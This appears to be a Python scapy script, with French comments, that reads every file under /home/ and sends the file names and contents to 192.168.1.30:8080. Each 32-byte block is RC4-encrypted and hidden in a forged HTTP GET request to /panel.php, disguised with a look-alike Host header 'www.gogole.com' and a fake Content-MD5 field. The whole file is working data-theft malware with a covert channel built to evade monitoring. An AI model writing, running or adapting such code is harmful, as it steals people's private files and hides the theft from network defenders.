import sys
import os
import time
import binascii
import random
import base64
from scapy.all import *

def rc4(k, d):
    res = []
    liste_256 = list(range(256))
    ozi4iqwms99xv = 0
    for pls in list(range(256)):
        ozi4iqwms99xv = (ozi4iqwms99xv + liste_256[pls] + ord(k[pls % len(k)])) % 256
        liste_256[pls], liste_256[ozi4iqwms99xv] = liste_256[ozi4iqwms99xv], liste_256[pls]
    ozi4iqwms99xv = lq4vbnj2t = 0
    for c in d:
        ozi4iqwms99xv = (ozi4iqwms99xv + 1) % 256
        lq4vbnj2t = (lq4vbnj2t + liste_256[ozi4iqwms99xv]) % 256
        liste_256[ozi4iqwms99xv], liste_256[lq4vbnj2t] = liste_256[lq4vbnj2t], liste_256[ozi4iqwms99xv]
        res.append(chr(ord(c) ^ liste_256[(liste_256[ozi4iqwms99xv] + liste_256[lq4vbnj2t]) % 256]))
    return ''.join(res).encode().hex()

def gen_array_32bytes(string):
    res = []
    i = 0
    while True:
        res.append(string[i:i+32])
        i = i + 32
        if i >= len(string)-1:
            break
    return res


def ls():
    list_files = []
    for r, d, f in os.walk('/home/'):
        for file in f:
            list_files.append(os.path.join(r, file))
    return list_files

def req(syn_ack, data_to_send, req_id):
    seq = syn_ack[TCP].ack # = 1
    ack = syn_ack[TCP].seq + 1 # 0 + 1 = 1
    for data in data_to_send:
        content_md5 = base64.b64encode(rc4(str(ack), data).encode()).decode()
        key = str(random.randint(1750, 0o21450)).encode().hex()
        d = base64.b64encode(str(random.randint(1000000000000, 9000000000000)).encode().hex().encode()).hex()
        getStr = 'GET /panel.php?id={}&key={}&data={} HTTP/1.1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nHost: www.gogole.com\r\nConnection: keep-alive\r\nContent-MD5: {}\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\r\n\r\n'.format(
            req_id, key, d, content_md5)
        reply = sr1(IP(dst=syn_ack[IP].src) / TCP(dport=syn_ack[TCP].sport,
                                                  sport=syn_ack[TCP].dport, seq=seq, ack=ack, flags='PA') / getStr, timeout=5)
        seq = reply[TCP].ack
        ack = len(reply[TCP].payload)
        if len(reply[TCP].payload) == 6:
            ack = reply[TCP].seq + 370
        elif len(reply[TCP].payload) != 370:
            ack = reply[TCP].seq + len(reply[TCP].payload) + 1
        else:
            ack = reply[TCP].seq + len(reply[TCP].payload)
        send(IP(dst=syn_ack[IP].src) / TCP(dport=syn_ack[TCP].sport,
                                           sport=reply[TCP].dport, seq=seq, ack=ack, flags='A'))
        time.sleep(0.1)
    return seq, ack


def send_it(blocks_32o):
    req_id = random.randint(1000, 9000) # ici = 5237
    dip = '192.168.1.30'
    dport = 8080
    gg = [blocks_32o[x:x+10] for x in range(0, len(blocks_32o), 10)]
    for g in gg:
        seq = random.randrange(0, (2**32)-1) # 4294967295 # ici 0 ?
        sport = random.randint(47890, 52910) # 51914
        syn = IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq, flags='S')
        last_req = sr1(syn, timeout=5) # Ici on envoie le syn
        send(IP(dst=dip) / TCP(sport=sport, dport=dport, seq=syn[TCP].seq + 1, ack=last_req[TCP].seq + 1, flags='A')) # ici on envoie un ACK
        seq, ack = req(last_req, g, req_id) # On envoie 10 bloc de 32 octets de données
        sr1(IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags='FA')) # On envoie Fin ACK
        send(IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq + 1, ack=ack + 1, flags='A')) # On envoie ACK
        time.sleep(1)
    return True


def send_list_files(list_files):
    a = '\n'.join(list_files)
    b = gen_array_32bytes(a.encode().hex())
    send_it(b)


def send_content_of_list_files(list_files):
    for file in list_files:
        with open(file, 'rb') as f:
            q = gen_array_32bytes(binascii.hexlify(f.read()).decode())
            send_it(q)
        f.closed


list_files = ls()
send_list_files(list_files)
send_content_of_list_files(list_files)